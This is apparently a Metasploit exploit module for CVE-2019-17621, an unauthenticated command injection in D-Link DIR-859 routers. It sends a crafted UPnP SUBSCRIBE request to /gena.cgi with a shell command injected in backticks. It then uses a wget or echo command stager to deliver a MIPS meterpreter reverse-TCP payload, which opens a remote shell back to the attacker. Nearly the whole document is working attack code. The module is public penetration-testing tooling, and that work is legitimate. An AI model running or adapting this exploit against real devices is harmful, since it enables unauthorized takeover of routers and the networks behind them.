##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link DIR-859 Unauthenticated Remote Command Execution',
      'Description' => %q{
        D-Link DIR-859 Routers are vulnerable to OS command injection via the UPnP
        interface. The vulnerability exists in /gena.cgi (function genacgi_main() in
        /htdocs/cgibin), which is accessible without credentials.
      },
      'Author'      =>
        [
          'Miguel Mendez Z., @s1kr10s', # Vulnerability discovery and initial exploit
          'Pablo Pollanco P.' # Vulnerability discovery and metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2019-17621' ],
          [ 'URL', 'https://medium.com/@s1kr10s/d94b47a15104' ]
        ],
      'DisclosureDate' => 'Dec 24 2019',
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'        => ARCH_MIPSBE,
      'DefaultOptions' =>
        {
            'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp',
            'CMDSTAGER::FLAVOR' => 'wget',
            'RPORT' => '49152'
        },
      'Targets'        =>
        [
          [ 'Automatic',	{ } ],
        ],
      'CmdStagerFlavor' => %w{ echo wget },
      'DefaultTarget'  => 0,
      ))

  end

  def execute_command(cmd, opts)
    #starting the telnetd gives no response
    begin
      send_request_raw({
        'uri'	=> "/gena.cgi?service=`#{cmd}`",
        'method' =>	'SUBSCRIBE',
        'headers' =>
        {
                'Callback' => '<http://192.168.0.2:1337/ServiceProxy0>',
                'NT' => 'upnp:event',
                'Timeout' => 'Second-1800',
        },
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end

  def exploit
    execute_cmdstager(linemax: 500)
  end
end
